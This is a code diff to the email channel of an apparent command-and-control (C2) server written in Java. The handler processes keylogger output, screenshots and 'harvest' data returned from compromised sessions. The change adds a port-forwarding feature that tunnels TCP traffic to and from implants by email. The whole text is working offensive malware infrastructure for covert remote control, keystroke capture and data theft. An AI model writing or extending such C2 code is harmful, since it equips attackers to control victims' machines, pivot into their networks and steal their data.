@@ -39,7 +39,8 @@ public class EmailHandler extends C2Interface {
 	public static final String KEYLOGGER_PREFIX = "Keylogger: ";
 	public static final String SCREENSHOT_PREFIX = "Screenshot: ";
 	public static final String HARVEST_PREFIX = "HARVEST:";
-
+	public static final String PORT_FORWARD_PREFIX = "PortForward: ";
+	
 	private int smtpPort;
 	private String emailHost;
 	private String emailUsername;
@@ -131,6 +132,12 @@ public class EmailHandler extends C2Interface {
 					sendEmail(session, command, sessionToEmails.get(session));
 					command = io.pollCommand(sessionId);
 				}
+				for(String address : io.availableForwards(sessionId)) {
+					String forward = io.grabForwardedTCPTraffic(sessionId, address);
+					if(forward != null) {
+						sendEmail(PORT_FORWARD_PREFIX + address + " " + session, forward, sessionToEmails.get(session));
+					}
+				}
 			}
 
 			// Read back any response
@@ -142,6 +149,8 @@ public class EmailHandler extends C2Interface {
 				boolean isKeylogger = false;
 				boolean isHarvest = false;
 				String harvestType = null;
+				boolean isPortForward = false;
+				String forwardAddress = null;
 				if (sessionElements.startsWith(KEYLOGGER_PREFIX)) {
 					sessionElements = sessionElements.replace(KEYLOGGER_PREFIX, "");
 					isKeylogger = true;
@@ -154,6 +163,12 @@ public class EmailHandler extends C2Interface {
 					harvestType = sessionElements.substring(0, firstSpaceIdx);
 					sessionElements = sessionElements.substring(firstSpaceIdx + 1);
 					isHarvest = true;
+				} else if(sessionElements.startsWith(PORT_FORWARD_PREFIX)) {
+					sessionElements = sessionElements.replace(PORT_FORWARD_PREFIX, "");
+					int firstSpaceIdx = sessionElements.indexOf(" ");
+					forwardAddress = sessionElements.substring(0, firstSpaceIdx);
+					sessionElements = sessionElements.substring(firstSpaceIdx + 1);
+					isPortForward = true;
 				}
 
 				String elements[] = sessionElements.split(" ");
@@ -185,7 +200,6 @@ public class EmailHandler extends C2Interface {
 				if (isKeylogger) {
 					keylogger.writeEntry(hostname, nextEmail.body.toString());
 				} else if (isHarvest) {
-					System.out.println("Harvest Type: " + harvestType);
 					harvester.processHarvest(harvestType, hostname, pid, username, nextEmail.body.toString());
 				} else if (isScreenshot) {
 					try {
@@ -200,6 +214,9 @@ public class EmailHandler extends C2Interface {
 					} catch (RuntimeException | IOException ex) {
 						ex.printStackTrace();
 					}
+				}else if (isPortForward) {
+					Integer sessionId = io.getSessionId(sessionUID);
+					io.queueForwardedTCPTraffic(sessionId, forwardAddress, nextEmail.body.toString());
 				} else {
 					Integer sessionId = io.getSessionId(sessionUID);
 					if (sessionId == null) {
